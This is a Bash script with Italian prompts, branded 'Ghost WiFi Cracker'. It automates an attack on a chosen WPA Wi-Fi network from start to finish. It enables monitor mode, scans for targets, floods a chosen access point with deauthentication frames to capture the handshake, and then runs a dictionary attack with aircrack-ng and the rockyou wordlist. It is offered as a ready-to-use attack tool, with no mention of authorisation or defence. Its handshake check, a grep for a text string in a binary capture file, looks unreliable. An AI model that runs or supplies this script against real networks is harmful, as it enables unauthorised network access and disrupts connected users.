#!/bin/bash
# ------------------------------------------------------------------------------
# GHOST WIFI CRACKER - PARROT OS EDITION
# ------------------------------------------------------------------------------

# Configurazione colori
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'
VERSION="4.0"
INTERFACE=""
TARGET_BSSID=""
TARGET_CHANNEL=""
HANDSHAKE_FILE="ghost-$(date +%s).cap"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# ASCII Art Ghost
show_header() {
    clear
    echo -e "${BLUE}"
    echo "   ▄████ ██▀███   ▒█████   ██████ ▄▄▄█████▓"
    echo "  ██▒ ▀█▓██ ▒ ██▒▒██▒  ██▒██    ▒ ▓  ██▒ ▓▒"
    echo " ▒██░▄▄▄▓██ ░▄█ ▒▒██░  ██░ ▓██▄   ▒ ▓██░ ▒░"
    echo " ░▓█  ██▒██▀▀█▄  ▒██   ██░ ▒   ██▒░ ▓██▓ ░ "
    echo " ░▒▓███▀░██▓ ▒██▒░ ████▓▒▒██████▒▒  ▒██▒ ░ "
    echo "  ░▒   ▒ ▒ ▒ ░▒ ░░ ▒░▒░▒░▒ ▒▓▒ ▒ ░  ▒ ░░   "
    echo "   ░   ░ ░ ░ ░ ░   ░ ▒ ▒░░ ░▒  ░ ░    ░    "
    echo " ░ ░   ░ ░   ░   ░ ░ ░ ▒ ░  ░  ░    ░      "
    echo "       ░           ░ ░        ░            "
    echo -e "${PURPLE}   ██▀███  ▓█████ ▒██   ██▒██▓███   ▄▄▄      "
    echo "  ▓██ ▒ ██▒▓█   ▀ ▒▒ █ █ ▒▓██░  ██▒████▄    "
    echo "  ▓██ ░▄█ ▒▒███   ░░  █  ░▓██░ ██▓▒██  ▀█▄  "
    echo "  ▒██▀▀█▄  ▒▓█  ▄  ░ █ █ ▒▒██▄█▓▒ ░██▄▄▄▄██ "
    echo "  ░██▓ ▒██▒░▒████▒▒██▒ ▒██▒▒██▒ ░  ░▓█   ▓██▒"
    echo "  ░ ▒▓ ░▒▓░░░ ▒░ ░▒▒ ░ ░▓ ░▒▓▒░ ░  ░▒▒   ▓▒█░"
    echo "    ░▒ ░ ▒░ ░ ░  ░░░   ░▒ ░░▒ ░      ▒   ▒▒ ░"
    echo "    ░░   ░    ░    ░    ░  ░░        ░   ▒   "
    echo "     ░        ░  ░ ░    ░               ░  ░"
    echo -e "${CYAN}            -= 𝕿𝖔𝖔𝖑 𝕬𝖚𝖙𝖔𝖗𝖎𝖟𝖟𝖆𝖙𝖔 =-${NC}"
    echo -e "${YELLOW}              v$VERSION - Parrot OS${NC}\n"
}

check_dependencies() {
    declare -A tools=(
        ["aircrack-ng"]="aircrack-ng"
        ["iwconfig"]="wireless-tools"
        ["macchanger"]="macchanger"
        ["xterm"]="xterm"
    )

    for cmd in "${!tools[@]}"; do
        if ! command -v $cmd &> /dev/null; then
            echo -e "${RED}[!] Manca $cmd. Installa con: sudo apt install ${tools[$cmd]}${NC}"
            exit 1
        fi
    done
}

set_monitor_mode() {
    echo -e "\n${YELLOW}[+] Configurazione interfaccia ${INTERFACE}${NC}"
    airmon-ng check kill > /dev/null 2>&1
    if airmon-ng start $INTERFACE | grep -q "monitor mode"; then
        INTERFACE="${INTERFACE}mon"
        echo -e "${GREEN}[✓] Modalità monitor attiva su ${INTERFACE}${NC}"
    else
        echo -e "${RED}[!] Errore attivazione modalità monitor!${NC}"
        exit 1
    fi
}

scan_targets() {
    echo -e "\n${YELLOW}[+] Scansione reti disponibili (CTRL+C per fermare)...${NC}"
    timeout 15 airodump-ng $INTERFACE
    echo -e "\n${YELLOW}--------------------------------------------------${NC}"
    read -p "Inserisci BSSID target (es: AA:BB:CC:DD:EE:FF): " TARGET_BSSID
    read -p "Inserisci canale: " TARGET_CHANNEL
}

launch_attack() {
    echo -e "\n${RED}[⚡] ATTACCO IN CORSO - CTRL+C PER FERMARE${NC}"
    echo -e "${PURPLE}[-] Target: ${TARGET_BSSID}"
    echo -e "[-] Canale: ${TARGET_CHANNEL}"
    echo -e "[-] File handshake: ${HANDSHAKE_FILE}${NC}"

    xterm -geometry 100x30-0+0 -e "airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w $HANDSHAKE_FILE $INTERFACE" &
    sleep 5
    aireplay-ng --deauth 10 -a $TARGET_BSSID $INTERFACE > /dev/null 2>&1

    if grep -q "WPA handshake" ${HANDSHAKE_FILE}-01.cap; then
        echo -e "\n${GREEN}[✓] Handshake catturato con successo!${NC}"
    else
        echo -e "\n${RED}[!] Handshake non catturato! Riprovare${NC}"
        exit 1
    fi
}

crack_password() {
    if [ ! -f "$WORDLIST" ]; then
        echo -e "${RED}[!] Wordlist non trovata!${NC}"
        read -p "Inserisci percorso wordlist: " WORDLIST
    fi

    echo -e "\n${YELLOW}[+] Avvio cracking con ${WORDLIST}...${NC}"
    aircrack-ng -w "$WORDLIST" "${HANDSHAKE_FILE}-01.cap"
}

cleanup() {
    echo -e "\n${YELLOW}[+] Pulizia ambiente...${NC}"
    airmon-ng stop $INTERFACE > /dev/null 2>&1
    service NetworkManager restart > /dev/null 2>&1
    rm -f ${HANDSHAKE_FILE}*.csv ${HANDSHAKE_FILE}*.netxml
    echo -e "${GREEN}[✓] Ambiente ripulito!${NC}"
}

# Main Execution
show_header
check_dependencies

if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] Questo script richiede i privilegi root!${NC}"
    exit 1
fi

echo -e "${BLUE}[1] Scegli interfaccia wireless:${NC}"
interfaces=($(iw dev | awk '$1=="Interface"{print $2}'))
select intf in "${interfaces[@]}"; do
    INTERFACE=$intf
    break
done

set_monitor_mode
scan_targets
launch_attack
crack_password

read -p "Vuoi pulire l'ambiente? (s/n): " clean
if [[ $clean == "s" ]]; then
    cleanup
fi

echo -e "\n${GREEN}[🎉] Operazione completata!${NC}"